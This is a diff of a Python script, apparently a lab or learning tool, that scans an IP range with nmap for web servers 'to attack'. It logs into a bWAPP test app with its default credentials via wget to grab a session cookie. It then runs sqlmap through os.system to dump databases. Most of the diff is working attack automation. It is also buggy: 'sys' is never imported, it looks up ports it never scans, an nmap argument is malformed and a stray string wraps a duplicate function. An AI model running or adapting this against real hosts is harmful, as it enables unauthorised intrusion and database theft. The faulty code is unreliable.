@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import os
+import nmap
 
 if os.geteuid() != 0:
     print("\nYou must run this script as a root user.\n")
@@ -9,6 +10,37 @@ if os.geteuid() != 0:
     response = input("Continue anyway for script testing purposes? y/n ")
     if response != "y":
         exit(0)
+
+
+
+def nmap_scan():
+    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")    
+	
+    nm = nmap.PortScanner()
+    nm.scan(hosts = ip_addr, arguments = '--open -n -sV-p80,443')
+    num = 0
+    
+    #exit if nothing scanned
+    if  len(nm.all_hosts()) == 0:
+        sys.exit(0)
+
+    for host in nm.all_hosts():
+        num+= 1
+        print ('---------------------------')
+        print ([num] ,host, '- state:', nm[host].state())
+        print ('port 135:', nm[host]['tcp'][135]['state'],'port 139:', nm[host]['tcp'][139]['state'])
+    print()
+    
+    print('Now, lets look for hidden paths in the webserver that could be exploitable')    
+    temp = int(input('Type the number of the IP that you would like to attack ')) - 1
+    
+    webserver = nm.all_hosts()[temp]
+    print(webserver)
+    return webserver
+"""
+
+
+
 
 def nmap_scan():
     ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
@@ -43,7 +75,7 @@ def parseNmapOutput():
     if count == 2 or count == 3:
         result = "No hosts found."
         return result
-
+"""
     
 
 
@@ -65,17 +97,43 @@ def inject_options_output():
     print("\nPlease type the corresponding type number: ")
 
 def sqlmap(webserver):
-    injection_options = ["?id=1&Submit=Submit#", "NOT available"]
+
+    option2 = " "
+    if(webserver == "10.0.2.15/bWAPP"):
+        os.system("wget --save-cookies /usr/share/sqlgo/cookies.txt --keep-session-cookies  --post-data 'login=bee&password=bug&security_level=0&form=submit'      http://10.0.2.15/bWAPP/login.php 1>wget.txt 2>wget.txt")
+        cookie = parseCookie()
+        option2 = "--cookie=\"PHPSESSID=" + cookie + ";security_level=0\" " + " --data=\"login=test&password=test&form=submit\""
+
+    injection_options = ["?id=1&Submit=Submit#\"", option2]
     hidden_path = input("What hidden path would you like to SQL inject? ")
     inject_options_output()
     option_chosen = int(input())
-    base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + injection_options[option_chosen - 1] + "\""
+
+    if option_chosen == 1:
+        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + injection_options[0]
+
+    if option_chosen == 2:
+        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + injection_options[1] 
+
     cmd = base_cmd + " --dbs"
+
+    print(cmd)    
     try:
         os.system(cmd)
     except KeyboardInterrupt:
         print ("SQLMap failed. Run script again")
     return base_cmd
+
+
+def parseCookie():
+    s = open("/usr/share/sqlgo/cookies.txt", "r")
+    line_iter = iter(s)
+    for line in line_iter:
+        if "PHPSESSID" in line:
+            arr = line.split()
+            cookie = arr[-1]
+            return cookie
+            
 
 def database_search(base_cmd):
     database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
